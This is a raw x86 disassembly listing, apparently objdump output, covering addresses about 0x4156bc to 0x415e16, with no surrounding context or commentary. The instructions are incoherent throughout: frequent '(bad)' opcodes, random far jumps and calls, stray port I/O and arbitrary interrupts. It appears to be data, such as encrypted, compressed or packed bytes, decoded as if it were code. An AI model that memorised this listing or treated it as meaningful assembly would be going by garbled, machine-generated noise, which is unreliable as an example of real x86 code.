  4156bc:	adc    al,0x39
  4156be:	test   BYTE PTR [eax],dh
  4156c0:	inc    ecx
  4156c1:	jl     0x41567d
  4156c3:	ds sbb bl,0xa8
  4156c7:	sub    DWORD PTR [eax-0x6f],edi
  4156ca:	lea    ecx,[ecx]
  4156cc:	pop    ebx
  4156cd:	dec    ebp
  4156ce:	push   esp
  4156cf:	pop    edx
  4156d0:	sbb    esp,ecx
  4156d2:	scas   al,BYTE PTR es:[edi]
  4156d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156d4:	cmc    
  4156d5:	and    eax,0xc5540965
  4156da:	rcr    BYTE PTR [esi+0x69],0x5d
  4156de:	jne    0x4156d5
  4156e0:	jmp    0x415730
  4156e2:	pop    esp
  4156e3:	popf   
  4156e4:	or     eax,0xfa49ea48
  4156e9:	push   edi
  4156ea:	xchg   ebp,eax
  4156eb:	push   eax
  4156ec:	pushf  
  4156ed:	add    DWORD PTR [ecx+0x32],eax
  4156f0:	inc    ebx
  4156f1:	cmp    BYTE PTR [ebx],ah
  4156f3:	fild   QWORD PTR [esi-0x5e]
  4156f6:	xor    al,0xc5
  4156f8:	out    dx,al
  4156f9:	shl    BYTE PTR [esi-0x197e44a9],0xa9
  415700:	cmp    bh,cl
  415702:	push   ebp
  415703:	cmp    al,0xe8
  415705:	hlt    
  415706:	fwait
  415707:	imul   eax,DWORD PTR [eax+0x16],0xd81ef4e6
  41570e:	mov    bl,BYTE PTR [eax]
  415710:	xchg   ecx,eax
  415711:	jb     0x41569f
  415713:	pop    esi
  415714:	or     DWORD PTR [edi-0x2cdf7929],esp
  41571a:	mov    cs,WORD PTR [edx+0x31ad0846]
  415720:	jns    0x4156da
  415722:	leave  
  415723:	jmp    0x370d:0x28ddf14
  41572a:	inc    esi
  41572b:	shr    BYTE PTR [edx+0x2],0x5e
  41572f:	jne    0x4156bb
  415731:	pop    ebp
  415732:	scas   al,BYTE PTR es:[edi]
  415733:	adc    esp,DWORD PTR [edx-0x5f950de8]
  415739:	enter  0x5b91,0x6a
  41573d:	adc    DWORD PTR [esi-0x7d],esi
  415740:	xchg   ecx,eax
  415741:	pop    eax
  415742:	popf   
  415743:	cld    
  415744:	scas   eax,DWORD PTR es:[edi]
  415745:	es pop edi
  415747:	xor    BYTE PTR [edx+0x78fcd94a],bl
  41574d:	jl     0x41578f
  41574f:	sub    al,0xc3
  415751:	fcom   DWORD PTR [esi+0x57]
  415754:	dec    esi
  415755:	sbb    al,0x63
  415757:	(bad)  
  415758:	mov    edx,0xf38ea6e5
  41575d:	inc    ebx
  41575e:	sub    eax,0x8a4f13dd
  415763:	sti    
  415764:	adc    al,0xf0
  415766:	cmp    al,0x58
  415768:	div    ecx
  41576a:	mov    eax,ds:0x86a61bda
  41576f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415770:	mov    cl,0x58
  415772:	mov    dh,BYTE PTR [edx+0x54f9e687]
  415778:	hlt    
  415779:	mov    ebp,0xdfe839c7
  41577e:	mov    bl,0xdc
  415780:	cli    
  415781:	call   0xb1ce046a
  415786:	loop   0x41572f
  415788:	mov    WORD PTR [ebx-0x3b2e9c0e],es
  41578e:	popa   
  41578f:	or     al,0xff
  415791:	xchg   DWORD PTR [ecx],ecx
  415793:	mov    dl,BYTE PTR [edx-0x32b30867]
  415799:	pop    ss
  41579a:	add    ch,BYTE PTR [eax-0xa]
  41579d:	aaa    
  41579e:	aad    0xa6
  4157a0:	test   al,0x90
  4157a2:	jmp    0x415764
  4157a4:	ret    
  4157a5:	pop    ebx
  4157a6:	pop    DWORD PTR [ebx]
  4157a8:	lds    eax,FWORD PTR [edi+0x4a]
  4157ab:	mov    esi,0xdeed2c92
  4157b0:	adc    esp,DWORD PTR [edx-0x42]
  4157b3:	mov    al,0x87
  4157b5:	jne    0x41580a
  4157b7:	adc    al,0x16
  4157b9:	ret    0x8419
  4157bc:	inc    ebp
  4157bd:	xchg   esp,eax
  4157be:	and    DWORD PTR [esi+eiz*4-0x52],edx
  4157c2:	adc    eax,DWORD PTR [edi-0x470acc27]
  4157c8:	and    BYTE PTR [edx],dh
  4157ca:	push   edi
  4157cb:	pop    esi
  4157cc:	aad    0x3f
  4157ce:	push   edi
  4157cf:	xchg   BYTE PTR [ebp-0x64],bl
  4157d2:	cmc    
  4157d3:	and    esi,edi
  4157d5:	and    al,0x8
  4157d7:	adc    ah,BYTE PTR [ebx+0x72]
  4157da:	(bad)  
  4157db:	out    0x5a,eax
  4157dd:	ficom  DWORD PTR [edi-0x7fd8a70f]
  4157e3:	push   edi
  4157e4:	push   esi
  4157e5:	xor    al,0xd9
  4157e7:	(bad)  
  4157e8:	fstp   DWORD PTR [eax]
  4157ea:	rcr    BYTE PTR [ecx-0x6b534b46],1
  4157f0:	aad    0x96
  4157f2:	and    BYTE PTR [ecx+0x2996f1e4],0x73
  4157f9:	pop    edx
  4157fa:	jae    0x4157db
  4157fc:	dec    edi
  4157fd:	jp     0x41579e
  4157ff:	or     eax,DWORD PTR [edi]
  415801:	push   ebx
  415802:	rcl    BYTE PTR [edx+0x67b7283e],0xb7
  415809:	push   0x2e
  41580b:	fild   WORD PTR [esi-0x72]
  41580e:	(bad)  
  41580f:	jb     0x415836
  415811:	(bad)  
  415812:	fisubr DWORD PTR [ebx-0x63592c9d]
  415818:	pop    edx
  415819:	into   
  41581a:	sbb    BYTE PTR [ebx-0x265afe7a],bl
  415820:	push   0xf7a093a4
  415825:	div    BYTE PTR ds:0x879e0ba9
  41582b:	bound  ebx,QWORD PTR [ebp+ebx*8-0x46]
  41582f:	mov    bh,0x42
  415831:	aad    0x70
  415833:	scas   al,BYTE PTR es:[edi]
  415834:	pusha  
  415835:	jne    0x41585a
  415837:	add    al,ch
  415839:	cmp    DWORD PTR [esi],eax
  41583b:	scas   eax,DWORD PTR es:[edi]
  41583c:	dec    ebp
  41583d:	or     ch,BYTE PTR [edx-0x9f2b70d]
  415843:	xchg   esp,eax
  415844:	test   BYTE PTR [ebp-0x2a7469d2],bh
  41584a:	push   ebp
  41584b:	mov    bl,bh
  41584d:	ja     0x4157f3
  41584f:	mov    ecx,0xe32b54eb
  415854:	mov    al,0x8c
  415856:	add    dl,BYTE PTR [ecx+esi*2+0x2afc7fdc]
  41585d:	mov    esi,esp
  41585f:	cmp    BYTE PTR [eax],dl
  415861:	add    eax,0x21011ffb
  415866:	cmp    al,0xf9
  415868:	test   DWORD PTR [ebp+ebp*2+0x2726db24],esp
  41586f:	sbb    bl,BYTE PTR [ebx]
  415871:	aas    
  415872:	xchg   esp,eax
  415873:	jl     0x415880
  415875:	arpl   WORD PTR [esi+0x1d],sp
  415878:	jg     0x415810
  41587a:	pop    ecx
  41587b:	inc    edi
  41587c:	mov    cl,0xff
  41587e:	mov    bh,bl
  415880:	enter  0xa5cd,0x6a
  415884:	mov    bh,0x5c
  415886:	pop    edi
  415887:	mov    bl,0x8e
  415889:	js     0x4158ca
  41588b:	add    al,0x74
  41588d:	ins    BYTE PTR es:[edi],dx
  41588e:	add    BYTE PTR [ebx-0x32f600b3],dl
  415894:	mov    ah,0x7c
  415896:	test   BYTE PTR [ebx],ch
  415898:	add    BYTE PTR [ebp+0x47da22fa],ch
  41589e:	inc    edi
  41589f:	clc    
  4158a0:	push   es
  4158a1:	hlt    
  4158a2:	dec    ecx
  4158a3:	jg     0x41584c
  4158a5:	xchg   esp,eax
  4158a6:	adc    bh,BYTE PTR [ebx-0x71049d90]
  4158ac:	fldz   
  4158ae:	jo     0x415907
  4158b0:	outs   dx,BYTE PTR ds:[esi]
  4158b1:	xchg   ebp,eax
  4158b2:	cwde   
  4158b3:	shl    DWORD PTR [esi+0x2c],1
  4158b6:	sahf   
  4158b7:	dec    ecx
  4158b8:	push   ecx
  4158b9:	sub    ch,bl
  4158bb:	jno    0x415843
  4158bd:	and    edx,DWORD PTR [edi-0x29615af7]
  4158c3:	sub    ebx,DWORD PTR [eax+eax*1-0x2d0d139]
  4158ca:	popf   
  4158cb:	out    0xa5,eax
  4158cd:	(bad)  
  4158ce:	cmp    BYTE PTR [esi*1-0x20f2c652],bl
  4158d5:	cli    
  4158d6:	popa   
  4158d7:	and    eax,0x8eb37b3
  4158dc:	xor    edx,DWORD PTR [eax]
  4158de:	inc    eax
  4158df:	xor    esi,edi
  4158e1:	out    dx,al
  4158e2:	inc    edx
  4158e3:	jmp    0x415951
  4158e5:	xchg   ebx,eax
  4158e6:	xchg   edi,eax
  4158e7:	stc    
  4158e8:	pop    ss
  4158e9:	out    0x65,al
  4158eb:	add    DWORD PTR [edx],ebx
  4158ed:	jle    0x41593f
  4158ef:	dec    DWORD PTR [edi+eiz*8-0x71]
  4158f3:	int    0x46
  4158f5:	scas   al,BYTE PTR es:[edi]
  4158f6:	jl     0x415880
  4158f8:	out    0xef,eax
  4158fa:	xchg   ebx,eax
  4158fb:	in     al,dx
  4158fc:	outs   dx,BYTE PTR ds:[esi]
  4158fd:	pop    ds
  4158fe:	add    ecx,DWORD PTR [esi]
  415900:	jb     0x415969
  415902:	mov    eax,ds:0x4ad85846
  415907:	outs   dx,BYTE PTR ds:[esi]
  415908:	(bad)  
  415909:	icebp  
  41590a:	jo     0x4158ed
  41590c:	loopne 0x4158f3
  41590e:	pop    es
  41590f:	mov    ds:0xf059e9d1,al
  415914:	and    ebp,DWORD PTR [esi+ecx*2]
  415917:	adc    eax,0xddb560b4
  41591c:	loope  0x4158f9
  41591e:	mov    ah,0xfc
  415920:	inc    esi
  415921:	nop
  415922:	pop    edx
  415923:	mov    ?,WORD PTR [eax+0x70]
  415926:	mov    bl,0xc6
  415928:	mov    edx,0x62b8e013
  41592d:	pop    ecx
  41592e:	xchg   BYTE PTR [edi],al
  415930:	fs retf 0xec7e
  415934:	mov    edx,0x6a6496bf
  415939:	out    dx,al
  41593a:	ror    DWORD PTR [edi+0x7d],cl
  41593d:	enter  0x4134,0x1a
  415941:	mov    eax,ds:0x62d2f3df
  415946:	or     DWORD PTR [ebx-0x3256d7a3],esi
  41594c:	jbe    0x4158e4
  41594e:	cld    
  41594f:	rol    BYTE PTR [eax+0x6cfc9f30],0xf8
  415956:	jb     0x41592e
  415958:	mul    bh
  41595a:	add    BYTE PTR [edx+0x5],dl
  41595d:	test   bl,0xd2
  415960:	mov    dl,0x4f
  415962:	pusha  
  415963:	pop    esp
  415964:	pop    edi
  415965:	mov    eax,0x614aa057
  41596a:	push   edi
  41596b:	mov    ebp,0x95c0f64f
  415970:	or     bl,BYTE PTR [eax-0x54]
  415973:	je     0x41591d
  415975:	sub    ch,BYTE PTR [ebx-0xc]
  415978:	and    DWORD PTR [esi],ecx
  41597a:	lods   eax,DWORD PTR ds:[esi]
  41597b:	push   ebx
  41597c:	mov    al,ds:0xf2b24f45
  415981:	xor    bl,ah
  415983:	add    al,BYTE PTR [eax-0x65]
  415986:	add    BYTE PTR ds:0x6faeaf2e,dl
  41598c:	sti    
  41598d:	xlat   BYTE PTR ds:[ebx]
  41598e:	jne    0x4159fd
  415990:	mov    ebp,edi
  415992:	sub    DWORD PTR [ecx],ebp
  415994:	or     dl,cl
  415996:	test   al,0xfd
  415998:	mov    WORD PTR [ebx+0x7923ef33],?
  41599e:	repz jbe 0x415934
  4159a1:	xor    BYTE PTR [edx+0x4159b8c6],dh
  4159a7:	sbb    DWORD PTR [edx-0x6e],edi
  4159aa:	fadd   DWORD PTR [ebp-0x69]
  4159ad:	std    
  4159ae:	icebp  
  4159af:	pop    ecx
  4159b0:	aaa    
  4159b1:	pop    ebp
  4159b2:	dec    esi
  4159b3:	xor    eax,0xcb78dede
  4159b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159ba:	repz and al,0x18
  4159bd:	out    dx,eax
  4159be:	xor    al,0x6
  4159c0:	pop    ds
  4159c1:	cmp    al,0xf5
  4159c3:	or     eax,0xc4b7f068
  4159c8:	test   DWORD PTR [esi],esi
  4159ca:	es in  eax,dx
  4159cc:	mov    ah,0x96
  4159ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159cf:	mov    WORD PTR [edi],?
  4159d1:	xchg   edi,eax
  4159d2:	add    BYTE PTR [edi],al
  4159d4:	lea    ebp,[esi-0x4ff6c60]
  4159da:	jmp    0x415994
  4159dc:	pop    ecx
  4159dd:	call   DWORD PTR [edi+0x445f492a]
  4159e3:	inc    ebx
  4159e4:	ins    BYTE PTR es:[edi],dx
  4159e5:	mov    esi,0xab475089
  4159ea:	test   DWORD PTR [ecx+0x666461e1],ecx
  4159f0:	jmp    0xbb76cae3
  4159f5:	hlt    
  4159f6:	sbb    bl,cl
  4159f8:	mov    al,ds:0x90777a6f
  4159fd:	pop    edi
  4159fe:	mov    eax,0xc0dc08a6
  415a03:	and    al,0x9d
  415a05:	das    
  415a06:	dec    ebp
  415a07:	inc    ebx
  415a08:	xor    ch,BYTE PTR [edx+ecx*4]
  415a0b:	sub    ebx,ebp
  415a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a0e:	jge    0x415a4c
  415a10:	ror    BYTE PTR [ebx],cl
  415a12:	and    al,0xeb
  415a14:	sbb    al,0x64
  415a16:	sbb    DWORD PTR [edi],edi
  415a18:	inc    esi
  415a19:	adc    al,0xea
  415a1b:	out    dx,eax
  415a1c:	jmp    FWORD PTR [edi]
  415a1e:	test   eax,0xfb377b49
  415a23:	(bad)  
  415a24:	mov    esp,0xf1dc046c
  415a29:	push   eax
  415a2a:	das    
  415a2b:	xor    BYTE PTR [edi-0x3b38fa49],dl
  415a31:	pop    esp
  415a32:	adc    al,0xe6
  415a34:	stos   DWORD PTR es:[edi],eax
  415a35:	push   ecx
  415a36:	ret    0xf7ac
  415a39:	xchg   DWORD PTR [ebp-0x2],esi
  415a3c:	xor    ch,bl
  415a3e:	sar    BYTE PTR [ebx-0x1d],1
  415a41:	sbb    eax,0xf66113e1
  415a46:	retf   0xa67d
  415a49:	(bad)  
  415a4a:	les    edi,FWORD PTR [ecx+0x6953b0cb]
  415a50:	cmc    
  415a51:	int    0xbb
  415a53:	mov    BYTE PTR [ecx-0x28],bh
  415a56:	and    ah,ch
  415a58:	pop    edi
  415a59:	scas   eax,DWORD PTR es:[edi]
  415a5a:	xlat   BYTE PTR ds:[ebx]
  415a5b:	dec    eax
  415a5c:	lods   al,BYTE PTR ds:[esi]
  415a5d:	and    esp,ebx
  415a5f:	cwde   
  415a60:	cdq    
  415a61:	pop    DWORD PTR [ebp+0x5e]
  415a64:	outs   dx,DWORD PTR ds:[esi]
  415a65:	add    esp,ebx
  415a67:	int3   
  415a68:	xchg   esi,eax
  415a69:	mov    dl,0xff
  415a6b:	mov    bh,0xca
  415a6d:	ins    DWORD PTR es:[edi],dx
  415a6e:	and    ebp,esi
  415a70:	ss inc ecx
  415a72:	dec    esi
  415a73:	aas    
  415a74:	ds and eax,0x61d82d78
  415a7a:	scas   eax,DWORD PTR es:[edi]
  415a7b:	test   DWORD PTR [edx+0x32],eax
  415a7e:	in     eax,dx
  415a7f:	rcr    BYTE PTR ds:[ebx+0x52],cl
  415a83:	push   edx
  415a84:	xor    al,0x80
  415a86:	scas   al,BYTE PTR es:[edi]
  415a87:	sbb    al,0x85
  415a89:	mov    ds:0x8fc84243,al
  415a8e:	in     al,0xa5
  415a90:	les    ebp,FWORD PTR [ebp-0x153c4239]
  415a96:	mov    edi,0x53437be1
  415a9b:	sti    
  415a9c:	pop    es
  415a9d:	ficomp DWORD PTR [esi]
  415a9f:	add    al,0x10
  415aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415aa2:	loop   0x415afc
  415aa4:	add    BYTE PTR [edi],bl
  415aa6:	jns    0x415abe
  415aa8:	aam    0xa5
  415aaa:	retf   0xe474
  415aad:	push   eax
  415aae:	jl     0x415b15
  415ab0:	clc    
  415ab1:	cmp    ch,bl
  415ab3:	inc    ebx
  415ab4:	push   ebp
  415ab5:	out    0x76,al
  415ab7:	out    dx,al
  415ab8:	int    0x15
  415aba:	cmp    dl,BYTE PTR [edi-0x1c]
  415abd:	mov    bh,0x47
  415abf:	xchg   BYTE PTR [edx-0x23],cl
  415ac2:	and    eax,0xad46f0e2
  415ac7:	test   eax,0x585b9729
  415acc:	or     BYTE PTR [edi-0x20],ah
  415acf:	mov    WORD PTR [ebx+0x22],es
  415ad2:	out    0x21,eax
  415ad4:	cs inc ebx
  415ad6:	inc    ebx
  415ad7:	pmuludq mm5,mm3
  415ada:	nop
  415adb:	mov    ds:0x766efb1d,al
  415ae0:	pop    ebp
  415ae1:	fwait
  415ae2:	xor    DWORD PTR [ecx+ecx*1-0x604948f],0xd5a6c9fb
  415aed:	pop    ds
  415aee:	adc    esi,esi
  415af0:	das    
  415af1:	stos   DWORD PTR es:[edi],eax
  415af2:	jge    0x415a78
  415af4:	mov    bh,0x84
  415af6:	sub    ah,al
  415af8:	js     0x415b37
  415afa:	ds sti 
  415afc:	dec    edi
  415afd:	add    BYTE PTR [ebx+0x6d],cl
  415b00:	xor    BYTE PTR [ecx],0x7c
  415b03:	call   0x7226:0xaea50237
  415b0a:	sti    
  415b0b:	fidiv  WORD PTR [ecx-0x34]
  415b0e:	sbb    eax,0xab57ee5
  415b13:	xchg   ecx,eax
  415b14:	sbb    BYTE PTR [eax+edi*2],bl
  415b17:	inc    ebx
  415b18:	and    ch,BYTE PTR [ecx]
  415b1a:	lods   al,BYTE PTR gs:[esi]
  415b1c:	jb     0x415b0c
  415b1e:	imul   edx,DWORD PTR [ebx],0xffffffd4
  415b21:	sub    ecx,DWORD PTR [ecx+eax*2+0x7c]
  415b25:	idiv   BYTE PTR es:[esi+0x1e]
  415b29:	rcr    BYTE PTR [esi+0x21461f47],0x58
  415b30:	mov    esp,DWORD PTR [edi-0x5f388f98]
  415b36:	xchg   ebp,eax
  415b37:	cmp    DWORD PTR [edi+0x65],ebp
  415b3a:	mov    ch,0xf2
  415b3c:	sub    BYTE PTR [ecx-0x52],dl
  415b3f:	jns    0x415b29
  415b41:	inc    edx
  415b42:	js     0x415b33
  415b44:	xchg   edi,eax
  415b45:	pushf  
  415b46:	push   0x8b50a7b5
  415b4b:	xor    al,0xce
  415b4d:	mov    eax,ds:0x709605d9
  415b52:	retf   0x2bfe
  415b55:	cmp    DWORD PTR [edi+0x6ed628c3],eax
  415b5b:	in     al,dx
  415b5c:	pop    edi
  415b5d:	mov    ah,BYTE PTR [edi-0x305b7046]
  415b63:	jecxz  0x415b88
  415b65:	mov    bl,0x56
  415b67:	jns    0x415b38
  415b69:	inc    ebp
  415b6a:	(bad)  
  415b6b:	adc    eax,0xb1cf8758
  415b70:	cmp    eax,0xf55bd425
  415b75:	scas   eax,DWORD PTR es:[edi]
  415b76:	out    dx,eax
  415b77:	adc    BYTE PTR [edi],0x34
  415b7a:	xchg   ecx,eax
  415b7b:	scas   al,BYTE PTR es:[edi]
  415b7c:	push   0xffffff9f
  415b7e:	scas   al,BYTE PTR es:[edi]
  415b7f:	lods   eax,DWORD PTR ds:[esi]
  415b80:	(bad)  
  415b81:	cmp    eax,0x36ec46de
  415b86:	fucomip st,st(6)
  415b88:	sub    DWORD PTR [edi+0x1bd1f4d2],0x33
  415b8f:	pop    ebp
  415b90:	std    
  415b91:	xlat   BYTE PTR ds:[ebx]
  415b92:	sbb    BYTE PTR [edx],ah
  415b94:	scas   eax,DWORD PTR es:[edi]
  415b95:	call   0xb1cc11d5
  415b9a:	xchg   ebp,esp
  415b9c:	scas   al,BYTE PTR es:[edi]
  415b9d:	outs   dx,DWORD PTR ds:[esi]
  415b9e:	add    DWORD PTR [edx],ebp
  415ba0:	mov    eax,ds:0xc71befb1
  415ba5:	sbb    DWORD PTR [edx+eiz*1],eax
  415ba8:	xchg   edx,eax
  415ba9:	pop    ebx
  415baa:	pop    eax
  415bab:	test   BYTE PTR [edi],bh
  415bad:	call   DWORD PTR [ebp-0x21]
  415bb0:	mov    ch,0x2b
  415bb2:	loopne 0x415b79
  415bb4:	jno    0x415bb3
  415bb6:	stos   BYTE PTR es:[edi],al
  415bb7:	xchg   esp,eax
  415bb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bb9:	(bad)  
  415bba:	push   cs
  415bbb:	and    DWORD PTR [eax-0x6e],eax
  415bbe:	sahf   
  415bbf:	sbb    edx,edx
  415bc1:	pop    ecx
  415bc2:	mov    dh,0xd7
  415bc4:	fidiv  DWORD PTR [ebx+0x10]
  415bc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bc8:	mov    esi,DWORD PTR [edx-0x74]
  415bcb:	leave  
  415bcc:	into   
  415bcd:	ins    BYTE PTR es:[edi],dx
  415bce:	pop    ds
  415bcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bd0:	mov    bh,BYTE PTR [ecx-0x312c0e21]
  415bd6:	fadd   QWORD PTR [esi]
  415bd8:	push   cs
  415bd9:	aad    0x14
  415bdb:	lea    edx,[ebx+0x6edb7501]
  415be1:	sub    cl,dl
  415be3:	jmp    0x415c06
  415be5:	callw  0x84f3
  415be9:	sbb    al,0x67
  415beb:	retf   
  415bec:	fs xor al,0xf4
  415bef:	shl    BYTE PTR [eax+0x24abb39a],0x9e
  415bf6:	xchg   DWORD PTR [edi-0x52154b5a],eax
  415bfc:	mov    esp,0xdd0ed0b5
  415c01:	mov    DWORD PTR [edi+0x4b97a386],esi
  415c07:	fcomp  DWORD PTR [esi+0x1b5645bf]
  415c0d:	cwde   
  415c0e:	mov    BYTE PTR [esi+0x12],ch
  415c11:	pop    ss
  415c12:	xor    al,bh
  415c14:	add    BYTE PTR [ebp+0x18],dh
  415c17:	lea    edx,[eax+0x3f89d54a]
  415c1d:	dec    edx
  415c1e:	push   ds
  415c1f:	ficomp WORD PTR [eax]
  415c21:	stos   BYTE PTR es:[edi],al
  415c22:	ins    BYTE PTR es:[edi],dx
  415c23:	adc    DWORD PTR [esi-0x3d0a944c],ecx
  415c29:	cdq    
  415c2a:	xchg   esp,eax
  415c2b:	sub    ah,BYTE PTR [edi]
  415c2d:	dec    ebx
  415c2e:	enter  0x775d,0x62
  415c32:	pop    ebx
  415c33:	in     eax,0x28
  415c35:	or     edi,esi
  415c37:	test   al,0x1d
  415c39:	xor    eax,0xcd48b31
  415c3e:	inc    eax
  415c3f:	sar    BYTE PTR [esp+ebp*4],1
  415c42:	pop    ds
  415c43:	mov    dl,0x8a
  415c45:	test   DWORD PTR [ecx],ebx
  415c47:	push   es
  415c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c49:	push   ss
  415c4a:	(bad)  
  415c4b:	cs out 0x6c,al
  415c4e:	int    0x5b
  415c50:	lea    esp,[ebp+eiz*1+0x35]
  415c54:	push   edi
  415c55:	jge    0x415c17
  415c57:	cdq    
  415c58:	mov    eax,ds:0xe41b7bdb
  415c5d:	lock cmp eax,0xa784d778
  415c63:	out    0x8a,eax
  415c65:	dec    eax
  415c66:	mov    esp,0x8f861b86
  415c6b:	dec    ecx
  415c6c:	fdivr  QWORD PTR [esi]
  415c6e:	outs   dx,DWORD PTR ds:[esi]
  415c6f:	and    eax,0x687d4d8b
  415c74:	or     edx,edx
  415c76:	push   ebp
  415c77:	dec    eax
  415c78:	mov    edx,0x4468eec8
  415c7d:	ror    ah,0xf1
  415c80:	jp     0x415c3a
  415c82:	xor    edi,eax
  415c84:	add    al,0x4c
  415c86:	jle    0x415ce7
  415c88:	outs   dx,BYTE PTR ds:[esi]
  415c89:	dec    esi
  415c8a:	ds push edi
  415c8d:	jbe    0x415c83
  415c8f:	bnd ret 
  415c91:	xchg   ebp,eax
  415c92:	sub    DWORD PTR [ebx+0x15b455a5],edx
  415c98:	xchg   ebp,eax
  415c99:	shl    DWORD PTR [esi],cl
  415c9b:	mov    al,ds:0x72f0c29e
  415ca0:	es clc 
  415ca2:	cwde   
  415ca3:	in     al,dx
  415ca4:	sti    
  415ca5:	shl    BYTE PTR [edi+0x2f],1
  415ca8:	dec    BYTE PTR [edx+0x63b96c0e]
  415cae:	int3   
  415caf:	mov    al,ds:0x2611c6c7
  415cb4:	and    BYTE PTR [eax+0x2],0xae
  415cb8:	jne    0x415d20
  415cba:	fwait
  415cbb:	daa    
  415cbc:	hlt    
  415cbd:	xor    BYTE PTR [ecx],ch
  415cbf:	xchg   BYTE PTR [ecx+0x15],cl
  415cc2:	and    edx,DWORD PTR [ebx-0xbae1d92]
  415cc8:	popa   
  415cc9:	jo     0x415c5e
  415ccb:	dec    esi
  415ccc:	xchg   esp,eax
  415ccd:	mov    BYTE PTR [esi-0x1b],al
  415cd0:	jge    0x415cc7
  415cd2:	punpckhbw mm3,QWORD PTR [edi+0x19]
  415cd6:	adc    al,0x3c
  415cd8:	and    DWORD PTR ds:0x29d00437,ecx
  415cde:	frstor [ebx]
  415ce0:	inc    ebp
  415ce1:	xor    esp,DWORD PTR [edi]
  415ce3:	les    eax,FWORD PTR [edx-0x40]
  415ce6:	sbb    al,0x50
  415ce8:	int3   
  415ce9:	xchg   ebp,eax
  415cea:	lods   eax,DWORD PTR ds:[esi]
  415ceb:	popa   
  415cec:	push   0xffffff92
  415cee:	cmc    
  415cef:	push   esi
  415cf0:	pop    esp
  415cf1:	cmp    edi,ecx
  415cf3:	and    al,0x76
  415cf6:	pop    esp
  415cf7:	sbb    al,ch
  415cf9:	retf   
  415cfa:	nop
  415cfb:	punpcklwd mm2,mm6
  415cfe:	fcmovbe st,st(3)
  415d00:	js     0x415cb9
  415d02:	adc    al,0xf8
  415d04:	mov    ds:0xb8d4446b,eax
  415d09:	sbb    al,BYTE PTR [edx+0x1b40225d]
  415d0f:	frstor [ebx]
  415d11:	mov    esp,0x5d38ed5f
  415d16:	test   BYTE PTR [bx+di-0x2533],bl
  415d1b:	(bad)
  415d1f:	int    0x32
  415d21:	pop    ds
  415d22:	add    BYTE PTR [esi+edi*2],bl
  415d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d26:	not    DWORD PTR [ebp+0x1fa9db62]
  415d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d2d:	stc    
  415d2e:	inc    ebp
  415d2f:	int    0x45
  415d31:	lds    ebx,FWORD PTR [edi]
  415d33:	ret    
  415d34:	pop    edx
  415d35:	mov    edx,0xbc6d50b8
  415d3a:	and    BYTE PTR [edx],al
  415d3c:	jp     0x415d1f
  415d3e:	push   ebp
  415d3f:	mov    dl,0xc5
  415d41:	push   edi
  415d42:	lock mov cl,0x49
  415d45:	sti    
  415d46:	fadd   DWORD PTR [edi]
  415d48:	test   BYTE PTR [ecx+0x47cd05bb],dh
  415d4e:	pop    edi
  415d4f:	not    bh
  415d51:	fwait
  415d52:	dec    edi
  415d53:	lods   al,BYTE PTR ds:[esi]
  415d54:	cmp    ch,BYTE PTR [ecx-0x3ad5e6ee]
  415d5a:	xchg   edi,eax
  415d5b:	pop    ss
  415d5c:	inc    esi
  415d5d:	xchg   esp,eax
  415d5e:	jno    0x415d8d
  415d60:	aam    0x55
  415d62:	pop    ecx
  415d63:	fmul   st,st(4)
  415d65:	ret    0x4275
  415d68:	sahf   
  415d69:	mov    ss,WORD PTR [ebx]
  415d6b:	dec    esi
  415d6c:	arpl   WORD PTR [edi],di
  415d6e:	(bad)  
  415d6f:	lods   eax,DWORD PTR ds:[esi]
  415d70:	dec    esp
  415d71:	inc    eax
  415d72:	jb     0x415d10
  415d74:	sahf   
  415d75:	xchg   esp,eax
  415d76:	imul   ebp,edi,0xffffffcc
  415d79:	and    DWORD PTR [ebx],ecx
  415d7b:	repnz and BYTE PTR [ecx-0x4b21eb75],al
  415d82:	jae    0x415dd0
  415d84:	push   cs
  415d85:	sbb    BYTE PTR [eax+0xd],ah
  415d88:	push   0x10b5e197
  415d8d:	xor    edi,ebx
  415d8f:	mov    bh,0xb3
  415d91:	push   edi
  415d92:	sbb    al,0x30
  415d94:	fucomp st(0)
  415d96:	mov    al,ds:0x581b355b
  415d9b:	or     edx,ebx
  415d9d:	mov    dh,0xc4
  415d9f:	cmp    eax,DWORD PTR [edx+edi*1+0x6b]
  415da3:	jmp    0x292e5af0
  415da8:	push   ecx
  415da9:	pop    edx
  415daa:	in     eax,0x78
  415dac:	xor    BYTE PTR [edx+0x657b27b4],0xe9
  415db3:	bound  esi,QWORD PTR [edx]
  415db5:	mov    esi,0x1044925c
  415dba:	jle    0x415e1f
  415dbc:	jo     0x415d3f
  415dbe:	repnz int 0x58
  415dc1:	jo     0x415dd5
  415dc3:	cmp    eax,0x791116c2
  415dc8:	leave  
  415dc9:	loope  0x415d4d
  415dcb:	ins    DWORD PTR es:[edi],dx
  415dcc:	sti    
  415dcd:	add    al,0x80
  415dcf:	or     al,0x72
  415dd1:	push   0xffffffe7
  415dd3:	mov    al,0xf6
  415dd5:	cs sub ah,al
  415dd8:	adc    esi,DWORD PTR [ecx+0x7513e1d2]
  415dde:	xchg   ecx,edi
  415de0:	sar    DWORD PTR [ecx],cl
  415de2:	test   BYTE PTR [eax-0x2a917831],cl
  415de8:	and    cl,dh
  415dea:	nop
  415deb:	mov    cl,0xe3
  415ded:	ins    BYTE PTR es:[edi],dx
  415dee:	imul   ebx,ebx,0xff76e29a
  415df4:	push   ds
  415df5:	mov    dl,0xad
  415df7:	imul   eax,DWORD PTR [esp+edi*8],0x7edbf569
  415dfe:	dec    eax
  415dff:	inc    eax
  415e00:	nop
  415e01:	or     ecx,ecx
  415e03:	mov    esi,0x5f9df20f
  415e08:	out    0xcb,al
  415e0a:	fneni(8087 only) 
  415e0c:	cld    
  415e0d:	inc    ecx
  415e0e:	mov    eax,0xa94b7606
  415e13:	popf   
  415e14:	es push edx
  415e16:	push   esp
